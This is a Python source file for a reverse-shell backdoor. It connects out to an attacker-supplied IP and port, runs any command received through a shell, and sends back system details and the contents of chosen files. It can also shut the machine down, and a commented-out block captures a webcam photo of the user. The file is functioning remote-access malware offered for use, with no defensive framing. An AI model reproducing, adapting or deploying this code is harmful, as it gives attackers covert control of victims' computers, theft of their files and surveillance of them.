import socket
import subprocess
import os
import platform
import getpass
import colorama
#import cv2
from colorama import Fore, Style
from time import sleep

colorama.init()


RHOST = "Your ip"
RPORT = 22222
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((RHOST, RPORT))


while True:
    try:
        header = f"""{Fore.RED}{getpass.getuser()}@{platform.node()}{Style.RESET_ALL}:{Fore.LIGHTBLUE_EX}{os.getcwd()}{Style.RESET_ALL}$ """
        sock.send(header.encode())
        STDOUT, STDERR = None, None
        cmd = sock.recv(1024).decode("utf-8", errors='ignore')

        # List files in the dir
        if cmd == "list":
            sock.send(str(os.listdir(".")).encode())

        # Shutdown laptop
        if cmd == "shutdown":
            sock.send("Shutting down connect laptop 10 seconds")
            os.system("shutdown /s /t 10")

        #To take photo of user
        #elif cmd == "photo":
         #   videoCaptureObject = cv2.VideoCapture(0)
          #  result = True
           # while(result):
            #    ret,frame = videoCaptureObject.read()
             #   cv2.imwrite("NewPicture.jpg",frame)
              #  result = False
            #videoCaptureObject.release()
            #cv2.destroyAllWindows()

        # Change directory
        elif cmd.split(" ")[0] == "cd":
            os.chdir(cmd.split(" ")[1])
            sock.send("Changed directory to {}".format(os.getcwd()).encode())

        # Change drive
        elif cmd == "C:":
            os.chdir("C:\\")
            sock.send("Changed directory to {}".format(os.getcwd()).encode())

        # Get system info
        elif cmd == "sysinfo":
            sysinfo = f"""
Operating System: {platform.system()}
Computer Name: {platform.node()}
Username: {getpass.getuser()}
Release Version: {platform.release()}
Processor Architecture: {platform.processor()}
            """
            sock.send(sysinfo.encode())

        # Download files
        elif cmd.split(" ")[0] == "download":
            with open(cmd.split(" ")[1], "rb") as f:
                file_data = f.read(1024)
                while file_data:
                    #print("Sending", file_data) allows user to see file data being sent
                    sock.send(file_data)
                    file_data = f.read(1024)
                sleep(2)
                sock.send(b"DONE")
            print("Finished sending data")

        # Terminate the connection
        elif cmd == "exit":
            sock.send(b"exit")
            break

        # Run any other command
        else:
            comm = subprocess.Popen(str(cmd), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            STDOUT, STDERR = comm.communicate()
            if not STDOUT:
                sock.send(STDERR)
            else:
                sock.send(STDOUT)

        # If the connection terminates
        if not cmd:
            print("Connection dropped")
            break
    except Exception as e:
        sock.send("An error has occured: {}".format(str(e)).encode())
sock.close()